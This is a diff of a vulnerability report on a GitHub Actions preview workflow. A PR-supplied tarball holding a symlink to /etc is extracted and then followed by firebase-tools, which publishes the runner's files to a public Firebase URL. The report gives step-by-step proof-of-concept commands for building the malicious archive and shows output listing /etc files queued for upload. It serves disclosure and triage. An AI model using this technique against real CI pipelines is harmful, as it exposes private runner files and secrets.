@@ -1,16 +1,49 @@
-exact source
-unpacked deploy-artifact.tar.gz from unsafe-artifact.zip (uploaded by PR workflow)
+whether the symlink survives extraction:
+Yes. The unzipped tarball is extracted using `tar -xvzf "$extractDir/deploy-artifact.tar.gz" -C "$firebasePublicDir"`, which preserves the attacker-controlled symlink inside the extracted directory (e.g. `leak -> /etc`).
 
-exact sink
-tar -xvzf extraction in github-actions/previews/upload-artifacts-to-firebase/action.yml followed by FirebaseExtended/action-hosting-deploy
+whether deploy succeeds:
+Yes. The `action-hosting-deploy` wraps `firebase-tools`, and `firebase deploy --only hosting` does not crash on symlinks.
 
-boundary crossed
-A PR-controlled tar archive is extracted into the deployment directory of a privileged workflow_run. An attacker-controlled symlink in the archive is preserved by tar and then traversed by the Firebase CLI (which uses `follow: true` in `glob`), exfiltrating the privileged runner's filesystem to a public Firebase URL.
+whether the deployed preview serves out-of-tree content:
+Yes. The Firebase CLI uses `glob` with `follow: true` to discover files to upload (`firebase-tools/lib/listFiles.js`). It actively traverses the symlink, reads the out-of-tree files (like `/etc/passwd`), computes their hashes, and uploads the privileged runner's filesystem to Firebase Hosting. The out-of-tree content is served publicly at the preview URL.
 
-attacker model
-A contributor submitting a PR who can upload a malicious ZIP artifact (containing a crafted tarball with a symlink to `/`) from the unprivileged PR build workflow.
+exact commands used:
+mkdir src; cd src
+echo "<h1>Hello</h1>" > index.html
+ln -s /etc leak
+tar -czvf ../deploy-artifact.tar.gz .
+cd ..
+zip unsafe-artifact.zip deploy-artifact.tar.gz
+extractDir="/tmp/fb-test-env/artifact-unpack"
+firebasePublicDir="/tmp/fb-test-env/firebase-public-dir"
+mkdir -p "$firebasePublicDir" "$extractDir"
+unzip unsafe-artifact.zip -d "$extractDir"
+tar -xvzf "$extractDir/deploy-artifact.tar.gz" -C "$firebasePublicDir"
+# Observe extraction creates the symlink:
+ls -la "$firebasePublicDir"
 
-why it is not just CI misuse
-The attacker does not need to compromise the privileged workflow directly; they only provide an artifact from an unprivileged PR run. The privileged workflow blindly extracts it and deploys the result, exposing its own secrets (like GITHUB_TOKEN or Firebase service key) to the public internet without the attacker ever running code in the privileged context.
+# Test what files firebase-tools prepares for upload:
+node -e "const {listFiles} = require('firebase-tools/lib/listFiles.js'); console.log(listFiles('firebase-public-dir'));"
 
-classification: reportable
+exact observed output:
+Archive:  unsafe-artifact.zip
+  inflating: /tmp/fb-test-env/artifact-unpack/deploy-artifact.tar.gz
+./
+./leak
+./index.html
+total 12
+drwxrwxr-x 2 jules jules 4096 Mar 25 21:53 .
+drwxrwxr-x 6 jules jules 4096 Mar 25 21:57 ..
+-rw-rw-r-- 1 jules jules   15 Mar 25 21:53 index.html
+lrwxrwxrwx 1 jules jules    4 Mar 25 21:53 leak -> /etc
+
+Node.js output:
+Listing files in public: /tmp/fb-test-env/firebase-public-dir
+[
+  'index.html',
+  'leak/xattr.conf',
+  'leak/wgetrc',
+  ...
+]
+
+final verdict: escalate
